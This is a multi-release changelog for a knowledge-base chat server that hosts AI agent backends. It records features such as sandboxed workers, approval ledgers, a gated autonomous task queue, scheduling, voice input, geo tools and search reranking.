  exports the experimental `LiveConversationProvider` seam with runtime
  validation, and the protocol gains the additive, negotiated `conversation_*`
  frames and `tool_resolution`. `createApp({ conversationProvider })` registers a
  provider beside dictation: the host admits work only on a client's semantic
  commit, runs it through the ordinary backend with the voice posture
  (new `StartTurnRequest.posture: "voice"`: Claude selects `VOICE_ALLOWED_TOOLS`,
  pi refuses the turn), never
  publishes a result for a cancelled, withdrawn or replaced request, and keeps a
  once-only permission announcement ledger across epochs. Clients that declare
  `toolResolution` learn whether a permission request was granted, denied,
  expired with its turn, or unknown. Legacy and rev-3 clients see no change.
  No provider adapter ships.
- ae61e82: BREAKING: correct public `SearchResult.tags` to `string | null` and optional
  `RerankCandidate.tags` to `string | null`, matching existing untagged results.
  TypeScript clients and external rerankers must handle null (for local text,
  use `tags ?? ""`). CLI/MCP/HTTP values, reranker inputs, built-in provider
  requests and rankings stay unchanged. Correct the server's private list mirror
  to the existing nullable/string fields, without an invented created field.
- fdd31e7: Run hosted pi sessions, extensions and shell tools in isolated workers before any writer initializes. Permission and bridge requests use bounded protocol pipes; exact Markdown edits use the server-owned application route with existing approvals. Masks reuse the shared server-owned PNG operation with Pi’s existing filenames and result paths. Cancellation ends the process tree and preserves committed edit receipts.

  Breaking pre-1.0 migration approved by the isolated-writer ruling: shell writes now stay in scratch, while the brain is read-only. Session JSONL defaults to `~/.local/state/brain-kit/pi/<SHA-256 of canonical brain path>/sessions`; configured session and native agent directories must be outside the brain and its ancestors, without aliases. Move existing transcripts to an external directory to resume their unchanged ids/history. Unsupported worker hosts visibly refuse. Credential/egress containment and autonomous enablement remain separate work.

- 8d966cf: Transcribe retained recordings only after explicit upload consent through the server. Add optional saved-audio speech support, read-only capability/status discovery, durable account-owned receipts and tombstones, and at most three explicit retries for definitive transient provider failures. Deepgram supports saved containers; Web Speech remains unavailable. Retain local audio through failures and durable transcript review, coordinate tabs, and never upload automatically on reconnect or reload.
- a26209c: Store and inspect scheduled tasks on a UI host without running them. The new
  `brain schedule add|list|cancel|due` commands talk only to the authenticated
  host, and six protected `/api/schedules` routes back them: a proposal, a
  verified operator approval, then publication of a Markdown definition under
  `context/scheduled-tasks/` with its approved snapshot kept in the operational
  ledger. Edited, missing or symlinked definitions quarantine the task; cancel is
  idempotent and retires the file; `due` is read-only. Every task reports
  `dispatch_disabled` until the Queue runtime ships. Proposals need the new
  `BRAIN_UI_SCHEDULE_INFERENCE_ORIGINS` setting, `context/scheduled-tasks` is
  excluded from indexing by default, and restore pauses restored schedules.
- 7719bca: Reopen scheduled tasks that a restore or an unknown effect paused. The new
  `brain schedule reconcile <id> --key KEY` command and the protected
  `POST /api/schedules/:id/reconcile` route record a verified operator decision,
  checked against the approved definition bytes, the approved execution policy
  and a usable creator. Reopening never replays an unknown occurrence, and a
  restore now also ends lost attempts as `unknown` and drops their Queue work.
  The UI server also gains the private occurrence admission boundary the Queue
  runtime will drive (one admission per due instant, three operations and a
  ten-minute deadline per attempt, crash recovery). Nothing wires it into the
  running app yet, so tasks still report `dispatch_disabled`.
- 83585eb: Route hosted capture, update, archive and permitted Markdown edits through a bounded server-owned application boundary with current authority, policy/alias denial and exact base hashes. Add hosted structured tools, preserve voice capabilities and archive confirmation, and explain CLI refusals in read-only workers.
- ed9c94a: Installation migration (breaking): the knowledge graph and the index-derived
  voice vocabulary now read the brain index through core's supported
  `@schlessera/brain/queries` entry instead of the server's own SQL, and
  `@schlessera/brain` is a new **optional peer**. A host that serves the graph
  view or keyterm-capable dictation must now add `@schlessera/brain` (same
  lockstep version; `>=0.40.0 <1.0.0` is accepted) to its own dependencies.
  Without it the server still boots: the five `/api/graph/*` endpoints answer
  503 `graph_unavailable`/`core_unavailable`, keyterms degrade to an empty
  vocabulary while pronunciation overrides keep working, and every other
  feature is unaffected. The peer is resolved once per app and checked for
  package identity, version range and required operations; there is no SQL,
  PATH-CLI or subprocess fallback. Graph 500 bodies are now a sanitized
  `internal_error`, a locked index answers 503 `index_busy`, an index claiming
  the graph layout without its tables also refuses neighborhoods, and
  `writeCache` (including the post-sync rebuild) never persists a degraded
  vocabulary.
- 96ad470: Add the shared read-only bubblewrap worker launcher and refuse interactive,
  voice, autonomous and handoff-summary turns before runtime initialization when
  the actual host boundary probe fails. Native macOS and Windows hosts refuse.
  Expose the SDK's environment descriptors at the root export; the worker payload
  is internal transport, required only by the trusted bootstrap.

### Patch Changes

- d36cca7: Queue a message sent to a session whose turn has already streamed its result, instead of handing it to the backend's live `followUp()`. Between the result and the turn's end the backend has nothing left to deliver into, so the message was refused with `FOLLOWUP_FAILED` and lost; it now becomes the session's next turn.
- 7286b2f: Stop losing a follow-up sent while a resumed or queued turn is still starting. The host handed such a message to the backend's `followUp()` as soon as the turn was registered as running, before the turn had reached the backend, so the Claude backend refused it and the message was dropped with `FOLLOWUP_FAILED`. The host now injects a follow-up natively only once the turn has been handed to `startTurn`, and queues it as the session's next turn before that. A follow-up that the backend still refuses with its "no running turn" `BackendRequestError` is queued the same way instead of being discarded, and keeps the local exchanges its refused prompt carried.
- f341317: After a reload, the chat no longer shows the welcome screen while the next message would go into the previously selected conversation. Until that conversation's history arrives, Chat says "Restoring conversation", the composer keeps the draft and explains why sending waits, and no message can be sent into it from any surface. The history request is confirmed rather than fire-and-forget: it is asked for again on the next connection, and once on the session's next idle status, and a request nothing answers ends after 20 seconds in "Couldn't restore this conversation" with Retry and New chat, as does a load error. Retry only reads the history again; New chat starts a new conversation without the old session id. Nothing is sent automatically once the history arrives. The host logs one `session resume` line per `session_resume`, with the session id and its outcome (`loaded`, `error` or `unauthorized`).
- 2c3e5bd: The Daily briefing panel now shows the keyless `brain briefing` output from `GET /api/brain/briefing`, the selected root's existing briefing route, with loading, empty, failure and Retry states. The internal `POST /api/brain/whatsup` route is gone, and with it the repo-local script lookup at `private/whatsup.ts` and `scripts/whatsup.ts` and its forced `--gemini` flag: opening the briefing runs no script and no agent turn. Because the briefing cannot spend, the rail, palette, More sheet and welcome chip no longer print `spends` beside it.

  `SuggestionChips` now sets its chip gaps as longhands, so a chip whose reason comes and goes on a rerender no longer makes React report a conflicting `gap`/`rowGap` style.

- 1caadca: Add `@schlessera/brain-common`, an internal-only package with no compatibility promise. Its `./internal/env` entry holds the environment descriptor core and `./internal/frontmatter` holds the cache-free `parseFrontmatter`. The packages that carried byte-identical copies of these files now depend on it instead. Environment and frontmatter parsing behave exactly as before, and every public export is unchanged. module-finance, module-jobs, module-travel and ui-server no longer depend on `gray-matter` directly.
- 02fd0b9: `@schlessera/brain-ui-sdk/server` now exports the helpers both shipped backends use, so a third-party backend can give the host the same behavior and security posture without reaching into `/internal`. The new names, all `@experimental` until 1.0: the bridge-tool handlers (`handleAskUser`, `handleAskUserForm`, `handleAskUserList`, `handleAskUserRank`, `handleGetCurrentLocation`, `handleQueryActivity`, `handleRequestImageMask`, `handleShowBlock`, with `ImageMaskHandlerOptions` and `LocationHandlerOptions`) and `BRIDGE_TOOL_POSTURE`; the exec wrapper (`wrapCommand`, `validateExecWrapper`, `EXEC_WRAPPER_ENV`, `EXEC_KILLER_ENV`); the subprocess environment filter (`filterSubprocessEnv`, `parseSubprocessEnvExtra`, `SubprocessEnvAudience`); the lock keys (`BRAIN_LOCK_KEY`, `bashLockKey`); `describeRetry`, `resolveThinkingLevel`, `assertLoadedSdk`, `rtkRewriteCommand`; and the bundled `DEFAULT_CONFIRM_BASH_PATTERNS`, whose entries may still change between releases. Their behavior is unchanged. They are no longer exported from the unsupported `@schlessera/brain-ui-sdk/internal` entry; first-party code imports them from `/server`.
- 9f0df49: Gated dispatcher decisions that approve an exact change now offer `apply` and `dismiss`, the one-commit shape the Actions card renders, instead of `apply` and `cancel`. With two commits the card treated the answer as ambiguous and showed a bare "Resolved" instead of the exact "Approved · queued …" receipt. Choices without an approvable operation keep their explicit cancel. Autonomous dispatch stays disabled in `createApp`.
- ba7e6fe: Internal only: the repository's dispatch fixture host can stop staging compensation between removal and acknowledgement, so a crash there can be proven through the gated dispatcher. Nothing a consumer can configure or import changes, and no autonomous dispatch is enabled.
- edb97e1: Internal only: the repository's dispatch fixture host can supply its own clock, so crash, lease-recovery and restore tests can drive the gated production dispatcher through elapsed lease and backoff time. No configuration, environment variable or default enables autonomous dispatch, and nothing a consumer can import changes.
- 4229675: Add the production Queue dispatcher behind the autonomous enablement gate. It routes arrivals through T0/T1 triage, runs agent-tier work and validated follow-ups in the restricted autonomous envelope, turns an exact Markdown proposal into a durable decision, and lets a follow-up apply exactly the approved tool, input and target once; any other change escalates and writes nothing. `createApp` still enables no dispatcher: no configuration, environment variable or default activates autonomous work, the internal poke keeps reporting `dispatchEnabled: false`, and operation-bearing approvals keep failing closed.
- da41eb6: Reserve one Jev breaker probe after backoff so concurrent classification calls skip until it completes.
- 16f9a8d: Refresh offline Claude price estimates for current models and correct Opus 4.6 base rates.
- 1a943d8: Document completion fallback credential names and existing inherited/filtered
  environment transport families in package metadata and generated READMEs.
  Descriptor types, public exports, runtime reads and forwarding policies are unchanged.
- 56cf3e3: Retain completed-response usage when restricted autonomous turns escalate or yield. Settle successful checkpoints using observed spend and a conservative allowance for any uncertain request, while preserving whole reservations for crashes and missing receipts.
- 95752cc: Preserve full raw-file responses for ignored conditional and HEAD ranges across Bun's native HTTP server.
- 30b5c20: Give operational backup export the server's five-second SQLite busy timeout so a temporary database lock does not immediately fail the recovery command.
- b300bb3: Repair packaged documentation links to the integration contract's authoritative surface files. Runtime behavior is unchanged.
- b5c30c1: Clarify the repository-only triage evaluator script documentation: success requires every repetition and full requested coverage, while observed failures take precedence over unavailable evidence.
- Updated dependencies [45326b1]
- Updated dependencies [637d2c4]
- Updated dependencies [9a89d4a]
- Updated dependencies [b0815ec]
- Updated dependencies [daf4546]
- Updated dependencies [1caadca]
- Updated dependencies [02fd0b9]
- Updated dependencies [825cd04]
- Updated dependencies [543231e]
- Updated dependencies [5416a22]
- Updated dependencies [98baa4c]
- Updated dependencies [75e79b6]
- Updated dependencies [18d5dde]
- Updated dependencies [6f06be8]
- Updated dependencies [84b8e00]
- Updated dependencies [368c318]
- Updated dependencies [90d83d8]
- Updated dependencies [ef479fd]
- Updated dependencies [d2436b8]
- Updated dependencies [56cf3e3]
- Updated dependencies [33af7e2]
- Updated dependencies [b04f98b]
- Updated dependencies [978031a]
- Updated dependencies [e632b50]
- Updated dependencies [d89e175]
- Updated dependencies [533c0a7]
- Updated dependencies [b180a2f]
- Updated dependencies [8d966cf]
- Updated dependencies [2a7de32]
- Updated dependencies [83585eb]
- Updated dependencies [0e4290f]
- Updated dependencies [70275b9]
- Updated dependencies [7b4f62a]
- Updated dependencies [b05d556]
- Updated dependencies [96ad470]
  - @schlessera/brain-ui-sdk@0.41.0
  - @schlessera/brain-geo@0.41.0
  - @schlessera/brain-render-template@0.41.0
  - @schlessera/brain-common@0.41.0

## 0.40.0

### Minor Changes

- 0575b1b: Add `ask_user_list`, a bridge tool that asks the user to place up to 30 items on one shared scale of 2–8 options in a single card, for rating, triage and sorting. The result maps item ids to the chosen option, lists the skipped ids, and carries optional per-item notes. It ships as new `ask_user_list_request` / `ask_user_list_response` protocol frames, a kit `AskUserListCard` (inline chip grid, "set the rest to …" with undo, a Submit that states what it will send and never silently does nothing), and a transcript binding that replays the answered summary after a reload. Both backends expose it, and withhold it from turns that have no one to show a card to. `ask_user` is unchanged.
- dee9b10: BREAKING: `createApp`, `probeClaudeRuntime` and `BackendModule.probeRuntime` now return promises; migrate callers to `await`.

  Boot version probes now cancel at their five-second deadline with bounded cleanup.

- 1ffb27b: Add atomic autonomous spend and operation admission budgets with durable reservations, conservative recovery and frozen settlement.
- 6267d4f: Add explicit nonpersistent autonomous turns and synchronous escalation capture.
  Both backends preserve ordinary session behavior while headless attempts keep
  runtime identity and usage in Activity without saving interactive history. This
  supplies turn plumbing; autonomous dispatch remains gated on containment,
  budgets, admission and system verification.
- 0aaabdd: Enforce each backend's actual imported SDK copies against its owning manifest constraints and optional host minima. Direct factories accept `versionRequirements`; Claude holds constrained start/resume prompts until its selected executable probe and SDK handshake pass. Pi reports its primary SDK at boot without a separate executable identity. Preserve measured-pair warnings, provenance, numeric defaults and terminal frames.
- 0c0c9df: Add `ask_user_form` for conditional questions answered in one card, with shared scale and ranking controls, configurable depth/node/options limits, visible-answer validation and history replay. Keep the existing ask tools available.
- 4656bfe: Persist escalation checkpoints, Actions and blocked work atomically. Resolve stored v1 decisions exactly once without inference, with authenticated WebSocket handling, deterministic snooze, the 60-decision cap, bounded retries and recoverable staging compensation. Exact-operation approval stays fail-closed until the autonomous engine supplies current server authority.
- cac8d11: Stream durable Queue and Actions on the authenticated WebSocket with per-subscription snapshots, foreign-write deltas, lossless bounded chunks, and principal revocation checks.
- f19da8b: Add authenticated `brain queue add` intake with explicit replay keys and scoped
  principal-cookie transport. Shares now create durable untrusted triage work,
  deduplicate normalized content, preserve server-owned provenance, and reconcile
  failed staging/database writes. Queueing does not file content or enable
  autonomous execution.
- b333db6: Add internal durable Queue and Action storage with guarded atomic transitions,
  immutable provenance, append-only checkpoints, cursor replay, lazy projection
  compaction and recoverable budget, suppression and scheduler records.
- c1a1595: Render recoverable failed-turn cards with reviewed diagnostics, subscription auth instructions, and a latest-turn Retry that retains original inputs and checks delivery after reconnect.
- 95865d1: Add optional host SDK/runtime/content-CLI minima, strict shared SemVer constraint composition, descriptor report verification, and explicit content-CLI rechecks before invocation. Preserve package bounds, default unknown-CLI warnings, and existing runtime report meanings.
- 48c87e1: Reserve interactive capacity while limiting autonomous operations to two by
  default. Shared locks prioritize interactive waiters and cooperatively yield
  long autonomous holders after a configurable 20-second wait. Yield checkpoints
  before abort, drains writers before recovering work, retains completed-call
  receipts and incurred costs, and bounds repeated interruption with a single
  dead-letter Action. Production autonomous dispatch remains disabled.
- 60d9690: The host keeps locally answered commands as part of the session (#582). A `local_exchange` frame, or a draft conversation's `localExchanges` on its first `chat_message`, is stored in a new `local_exchanges` table (migration `018_local_exchanges.sql`) and answered with `local_exchange_result`. The next prompt handed to the backend in that session (a new turn, a queued follow-up or an injected one) carries each pending exchange's `context` in a `<local-answer>` block after the user's text, once. `WsHost.prepareHistory` strips that block from the prompt that carried it, joins sources and blocks as before, and replays the exchange in front of it (or at the end when no prompt has carried it yet). A session without exchanges replays exactly as before. `SessionCatalog` gains optional `recordLocalExchange`, `takePendingLocalExchanges` and `loadLocalExchanges`.
- 4503591: Add schema-driven module Settings with per-module JSON overrides, validated revision-guarded saves, explicit source-preserving migrations and separate lifecycle/actions. Jobs exposes its complete scoring format, adapter choices and execution settings, preserving legacy scoring representation during migration and edits.
- a01c389: Add per-message reasoning effort with saved profile defaults for Claude and Pi.
  Claude defaults to Opus 5.5 at medium; each resumed turn re-reads its default,
  unsupported levels resolve downward, and retries retain the original override.
  Expose supported levels and honest requested/confirmed effort metadata. The
  existing model chip opens a model/effort picker; overrides clear on correlated
  start or queue acceptance and remain with refused drafts. Older hosts retain
  their existing send behavior.
- bcdd3d4: Ship `brain-ui-inbox export/restore` for complete operational database and share-staging backups. Empty-target restoration preserves Activity spend, principal identities, decisions and completion receipts, then atomically reconciles lost workers before opening dispatch. Interrupted restores resume from the same checksummed artifact; the documented host recovery-point objective is 24 hours.
- 35fb78d: Add ask_user_rank: one list ordered by handle drag, taps or keyboard, with explicit kept-order results, optional top-N cutoff, and answered transcript replay.
- 10235a5: Breaking change before 1.0: keep cron and other activity rollups unclassified when the root span has no valid recorded billing mode. Server credentials no longer supply a billing guess: billing mode, effective cost and its estimate flag stay unknown, while available list-price accounting remains visible. Explicit subscription/API billing and frozen historical costs retain their existing behavior.

  Consumers that previously relied on environment-derived cron billing must treat missing recorded billing as unknown. Available list-price cost remains a reference rather than an effective spend estimate; no historical backfill is performed.

- a270c46: Add the Queue recovery lifecycle and protected local HTTP poke with atomically rotated runtime tokens; production autonomous dispatch remains gated.
- 49bc6b2: Pre-1.0 breaking tightening: nonempty `confirmBashPatterns` / `BRAIN_UI_CONFIRM_BASH`
  lists with no valid regex now fail backend initialization instead of silently
  disabling confirmation. Repair the reported invalid entries, or explicitly set
  `[]` to disable confirmation. Missing configuration still uses defaults; mixed
  lists keep valid patterns and effects while reporting invalid entries. Malformed
  JSON and structurally unusable environment values retain their existing fallback.
- 878e6cf: Record `brain stats` over time (#581). `brain maintain` gains a `stats` step, run after the index and audit, that keeps the day's figures as one line of `.stats-history.jsonl` at the brain root: the counts, the health figures and the size totals, one snapshot per UTC day (a second run the same day replaces it), every day for 90 days and then one per week. The file is committed with the brain, so `brain index --force` and a fresh clone keep it; nothing indexes, validates or audits it. `brain stats --record` records on demand, and `brain stats --history [--since YYYY-MM-DD] [--json]` reads the snapshots back oldest first, one array per field, with `null` where a snapshot has no figure. `brain stats --json` is unchanged.

  `GET /api/brain/stats/history` passes the history through, and the PWA's /stats answer draws trend charts for documents, orphans, stale documents, embedding coverage and the broken-link rate once two snapshots exist, and nothing with fewer.

- e977423: **Breaking:** `brain sync` with no verb now prints one JSON result in machine mode (`--json`, or stdout not a TTY), where it used to print its text report whatever the output mode (#290). The result is `{ run, agent }`: `run` is the envelope `brain sync run --json` prints, report included, and `agent` says whether the `/sync` agent was invoked — `{ invoked: false, reason: "not-needed" | "no-runner" }`, or `{ invoked: true, runner, outcome, runtime, text, error? }`, where `runtime` is what that run reported about itself (`{ name, version }`, `version` null when it gave none) and null when it reported nothing. The built-in `claude` runner reports the Claude Code version from the session's `init` event; nothing is ever probed. Human mode (`--human`, or a terminal) is unchanged, and so are the exit codes and when the agent is called. A machine-mode agent failure prints the result as well as its error, and still exits `2`. Migration: a caller that read bare `brain sync` stdout as text passes `--human`, or reads `run.report` and `agent.text` from the result.

  `AgentRunner.run` and `runStreaming` accept an optional `onRuntime` callback, which a runner calls with what executed the run (experimental seam; runners that do not call it keep working).

  The server's sync paths ask for the result and record it on their own run's root span with the attributes chat's `runtime_observed` writes (`brain.runtime.name`/`version`), plus `brain.sync.agent`: the in-process scheduler now writes a root span for each of its runs, and the container cron wrapper reads the result of the base `sync` job only — the crontab line becomes `sh -c 'brain sync --json && brain index >&2'`, and the log still gets the readable report. `/api/status` adds `runtime.sync`: the latest sync run's own invocation state and runtime, and the last run that observed a version, with its run id and times. The UI's manual sync passes `--human`.

- 3f0870d: Attach validated GPX, KML and supported GeoJSON originals in chat, preserving incoming names and MIME separately from detected staged names. Keep server-derived file evidence on queued turns and replay. Draw static track blocks with complete metrics, waypoint evidence, explicit unknown and partial values, separate gaps and original references; resolve assets before PNG/PDF export. Generic share intake remains compatible.

### Patch Changes

- a408a0f: Restore the documented four-decimal list and effective cost sums in activity rollup responses for day, job and session groups. Round only after aggregation; stored costs, run detail and runtime stats retain their original precision.
- 96b2339: Define the supported backend permission toolkit and record its signatures and reachable types. Permission behavior and runtime policy values are unchanged.

  Breaking before 1.0: SDK `/server` no longer exports `DEFAULT_CONFIRM_BASH_PATTERNS`, `ARCHIVING_UPDATE_REASON`, `archivesDocument`, `bashCommand`, `SubprocessEnvAudience`, `SUBPROCESS_ENV`, `filterSubprocessEnv` or `parseSubprocessEnvExtra`. Claude's root no longer exports `DEFAULT_CONFIRM_BASH_PATTERNS` or `VOICE_ALLOWED_TOOLS`; pi's root no longer exports `DEFAULT_PI_ALLOWED_TOOLS` or `TOOL_RISK`. First-party consumers use the owning package's explicit `/internal` entry at the same lockstep version; those paths have no compatibility guarantee. External authors use the documented `/server` permission operations and configurable policy formats. Subscription-auth helpers remain public protocol API.

- 9c830e4: Frontmatter parsing no longer goes through gray-matter's process-wide cache. Two byte-identical documents parsed in one process now get independent data, so changing one can no longer change what is read for the other. Broken frontmatter is reported as invalid on every parse, not only the first; before, a second parse of the same bytes in a long-lived process read as an empty success. The cache also kept every distinct document string in memory for the life of the process, and that is gone. Frontmatter semantics and formatting are unchanged.
- 95ed68f: Preserve live turn failure classification, status and authentication actions when replaying recorded session history.
- a22b04d: Keep Inbox staging and budget reservations intact until the originating backend
  has finished unwinding. Recover killed attempts conservatively without leaving
  cleanup or expired Queue leases permanently blocked.
- 67c7403: Add the shared geo library with explicit GPX recovery and unit-bearing track summaries, normalized-track recovery and directional proximity measurements while retaining strict travel parsing and measurements.

  Add configured Nominatim geocoding with qualified candidates, explicit service failures, disk cache/source age and shared operator admission across CLI/server processes.

  Add configured prepared-dataset routing and explicit eligible FOSSGIS fallback, with honest source/transfer/cache metadata and nullable provider estimates.

  Add bounded Overpass POI queries near points or along retained track sections, mapped opening-hours unknowns, ordered fallback and persistent admission refusal handling.

  Share the existing SDK coastline/land/road geometry through geo, keeping compatibility exports/result-or-empty behavior while adding canonical configuration, cached layer sources and shared admission.

  Route SDK reverse geocoding through the shared client while retaining its nullable address result. Public Nominatim now requires explicit informed eligibility; the location tool keeps raw coordinates when eligibility is absent. Both first-party backends expose the opt-in setting.

  Add canonical geo configuration to brain config and the UI server adapter, preserving legacy endpoint/privacy switches and keeping disposable response caches separate from permanent geometry caches and global operator admission.

  Add deterministic vector static PNG maps with bundled fonts, preserved track gaps, numbered stops, complete legends and source/attribution evidence. Wide or unavailable backgrounds yield plain maps; unsupported projection, glyphs or image budgets retain complete text without changing source geometry.

  Add brain geo geocode, route, poi, track and map with one-document JSON contracts and qualified human output. Commands share canonical service configuration and cache/admission, retain original track evidence and protect local map writes through brain/scratch containment.

- 976c791: Reject malformed object-only HTTP request bodies before authentication field access, passkey updates or capture CLI dispatch.
- 6280c38: Register interactive requests before emitting their cards and waiting status, so refused duplicate ids leave the original request intact.
- 4c1a424: Add an opt-in visible-destination policy for PNG/PDF exports and enable it
  server-side for all app render requests. Accepted links keep canonical
  navigation with a validated visible host or mail address; refused links and
  unavailable repo paths stay inert. Raw/full/bare HTML, SVG targets, shadow
  content and embedded documents cannot bypass it. Chrome checks final disclosure,
  and the renderer lazily loads PDF.js to check each finished PDF annotation's own
  complete destination and print legibility,
  and refuses an export that still conceals or crops a destination. CLI defaults,
  classification rules and render isolation stay unchanged. UI-kit link imports
  re-export the same pure classifier from the template's dependency-safe leaf.
- Updated dependencies [0575b1b]
- Updated dependencies [dee9b10]
- Updated dependencies [6267d4f]
- Updated dependencies [96b2339]
- Updated dependencies [f0b84c0]
- Updated dependencies [0aaabdd]
- Updated dependencies [c849bf2]
- Updated dependencies [0c0c9df]
- Updated dependencies [cbc683a]
- Updated dependencies [f19da8b]
- Updated dependencies [c1a1595]
- Updated dependencies [95865d1]
- Updated dependencies [48c87e1]
- Updated dependencies [60d9690]
- Updated dependencies [4503591]
- Updated dependencies [a01c389]
- Updated dependencies [35fb78d]
- Updated dependencies [49bc6b2]
- Updated dependencies [cf6fee6]
- Updated dependencies [67c7403]
- Updated dependencies [d9e64c9]
- Updated dependencies [3f0870d]
- Updated dependencies [efafbb3]
- Updated dependencies [4c1a424]
  - @schlessera/brain-ui-sdk@0.40.0
  - @schlessera/brain-geo@0.40.0
  - @schlessera/brain-render-template@0.40.0

## 0.39.0

### Minor Changes

- e5d3cc0: The host keeps the `source` a client sends on `chat_message` and joins it back onto the user messages a backend replays, on `session_resume` and on the snapshot sent to a reconnecting client, whether or not a classifier is configured (#549). Sources live in a new `message_sources` table (migration `017_message_sources.sql`), keyed by session, a hash of the message's exact text, and its ordinal among identical texts. A message is recorded when its text is handed to the backend, so a message that is queued and then dropped is never counted. `SessionCatalog` gains optional `recordMessageSource` and `attachMessageSources` (a catalog without them replays every message as typed), and `WsHost.prepareHistory` joins sources and then classified blocks; `WsHost.attachMessageBlocks` is unchanged.
- 4f43158: Show client and server releases and application revisions in stats, including mismatched and unavailable identities.

### Patch Changes

- ba23fcc: Search can order results by relevance judgment. A new `Reranker` seam (`defineReranker`, `RerankCandidate`, `Ranked`, and `runRerankerContract` in `@schlessera/brain/testing`) has one built-in, `jev`: one TypeSafe System One Choice over the candidates per search, with each candidate's title, type, tags, summary, matched excerpt and lifecycle fields (status, relevance, updated) as evidence. It is the default rerank mode when `TYPESAFE_API_KEY` is set; without the key, search keeps the `heuristic` ordering. Measured with `brain eval` on a 1,133-document brain, hybrid hit@1 went from 0.407 (heuristic) and 0.556 (none) to 0.741 on 27 hand-written queries.

  `rerank` accepts `none | heuristic | jev` on `brain search`, `brain eval`, the MCP `brain_search` tool and `BRAIN_RERANK_MODE`. `heuristic` and `none` keep their meaning. The MCP input's default of `heuristic` is gone: an omitted `rerank` now follows the brain's `reranker.provider`. `jev` does not apply the lifecycle multipliers after its order. Applied there, they undid most of its gain.

  A new `reranker` config block sets `provider`, `model` (pinned to `jev-1.13.0`), `apiKeyEnv`, `exclude` (paths never sent, which keep their retrieval rank), `timeoutMs`, `depth` and an opt-in `skipMargin`. A reranker that fails, times out, or returns anything but a permutation leaves the retrieval order and says so in `warnings`. `brain search --rerank-dry-run` prints the outbound request and sends nothing. `brain eval` records `meta.reranker` and refuses a `--rerank jev` it cannot run. `brain doctor` gains a `reranker` check. `TYPESAFE_API_KEY` is forwarded to brain subprocesses and cron jobs.

  The helpers a search fanning out over several sources needs to rerank the union are exported: `partitionForRerank`, `mergeWithheld`, `assertPermutation`, `buildPathMatcher`, `candidateKey`, `selectReranker` and `rerankSetup`.

- 0c19962: `BrainClient.sync()` still runs bare `brain sync`, which now runs `brain sync run` and starts the agent only for what needs judgment. A sync that stops for judgment without an agent (exit 3) rejects with its report as the message.
- Updated dependencies [f5a8f81]
- Updated dependencies [ba23fcc]
- Updated dependencies [cf94a81]
- Updated dependencies [e5d3cc0]
- Updated dependencies [b8c355d]
- Updated dependencies [9342cd2]
  - @schlessera/brain-ui-sdk@0.39.0
  - @schlessera/brain-render-template@0.39.0

## 0.38.0

### Minor Changes

- 0230c6c: The file viewer previews PDFs, audio and video inline instead of offering only a download. A PDF is drawn by pdf.js, one page per canvas down the panel, and tapping a page opens it in the zoom viewer. MP3 and WAV play in a native `<audio>` element, and MP4 and WebM in an inline `<video>`. A PDF, audio or video file the browser cannot open, or a PDF page it cannot draw, falls back to the "Preview not available" card, which any other binary still gets. The binary viewer picks its previewer from a table keyed by MIME type.

  New config field `pdfWorkerUrl`: the URL of pdf.js's worker script, `pdfjs-dist/legacy/build/pdf.worker.min.mjs`, imported by the shell (with Vite, `?url`). Without it, or when it does not start a worker of the bundled pdf.js version, PDFs are parsed on the main thread. `@schlessera/brain-ui-react` now depends on `pdfjs-dist`.

  The raw file route (`/api/files/content?raw=1`) answers a single byte range on a GET with `206 Partial Content`, and a range past the end with `416`. Every raw file response carries `Accept-Ranges: bytes`. iOS Safari plays video and audio only from a server that does this. `/api/files/content` now reports `.pdf`, `.mp3`, `.wav`, `.mp4` and `.webm` files as `binary` whatever their bytes: an uncompressed PDF is plain ASCII, and used to come back as `text`, with its source as the content.

- 0b4f955: The generated crontab gains a weekly base job, `hygiene` (Mondays 06:00). It runs `brain hygiene reconcile` through the same wrapper and `cron_runs` recording as `sync`, `validate` and `maintain`, so the content-hygiene log's backlog and last-run date keep moving without anyone running the skill. It edits no content. Set `BRAIN_UI_CRON_HYGIENE=off` to leave it out.
- 564d7a1: A cron `sync` run whose `brain sync` exits non-zero is now recorded as an error in the run history and the job log, instead of as a success. `BrainClient.sync()` throws on a failed sync, like the client's other commands, and on success returns `{ message }` holding what `brain sync` printed. The `success`, `commits` and `conflicts` fields are gone: `brain sync` prints the agent's text, so nothing could fill them.
- d350daa: Transient output now has a place inside the brain: the scratch area, `.brain/scratch/`. `brain render --scratch` and `brain image --scratch` write there, under a name unique to each run, and so does `brain render -` without `--out`. The chat UI can open anything written there, it is never committed, indexed or exported, and it is pruned after 7 days or past 1 GB (after each of these writes, by `brain maintain`, hourly by the chat server, and by the new `brain scratch clean|prune`). Nothing writes there until git excludes the directory itself (`brain doctor --fix` adds the line, new brains have it from the template, and outside a git repository the line is required all the same, read by git), nothing is written to or pruned from a `.brain` or `.brain/scratch` that is a symlink, and every write goes to a temporary sibling renamed onto its name, so it never writes through a planted link. That covers every one of brain's own transient writers, wherever it is pointed: `brain render --out`, `brain image --out`, `brain okf export --out`, and a mask requested beside a draft in scratch, which now prunes like the others.

  Behaviour change: `brain render --out`, `brain image --out` and `brain okf export` never write through a symlink any more: a target whose entry is a link is refused, and every write goes to a temporary sibling renamed onto the name. `brain render` and `brain image` no longer accept paths under the system temp directory. A file there could not be opened from the UI. Use `--scratch` instead. `resolveWritable` now returns the path or `null`.

  `brain scratch clean|prune --json` reports `failed: [{ path, reason }]` (additive) for files the OS would not remove, and exits 2 when there are any; `brain maintain` reports its scratch step as failed the same way. A replaced output file keeps its mode. `BrainUiApp.close()` now returns a promise that resolves once the scratch prune pass in flight, if any, has been killed and has exited; await it before tearing down.

### Patch Changes

- 4224247: Source comments, the `BRAIN_UI_CHROME_NO_SANDBOX` description, and the `generate-pdf` and `image-gen` skills no longer describe one particular deployment. They say what a deployment may or may not have instead.
- Updated dependencies [8c1daaa]
- Updated dependencies [aec3dd8]
- Updated dependencies [a9094fb]
- Updated dependencies [1c30db2]
- Updated dependencies [1d29fcd]
- Updated dependencies [94fd8c9]
- Updated dependencies [70a5502]
- Updated dependencies [2d985ba]
- Updated dependencies [d350daa]
- Updated dependencies [e4b5251]
- Updated dependencies [4224247]
  - @schlessera/brain-ui-sdk@0.38.0
  - @schlessera/brain-render-template@0.38.0

## 0.37.0

### Minor Changes

- 7fe9bc0: An approval decision records the channel it was made on. `tool_approval` and
  `tool_denial` gain an optional `channel` (`card` | `voice`), stored on the
  `approval_decision` activity event; the host refuses a voice-attributed grant
  and leaves the request pending; the web client's approval cards send `card`;
  and a resolved approval in Actions reads as the decision and its channel
  ("Denied by voice").
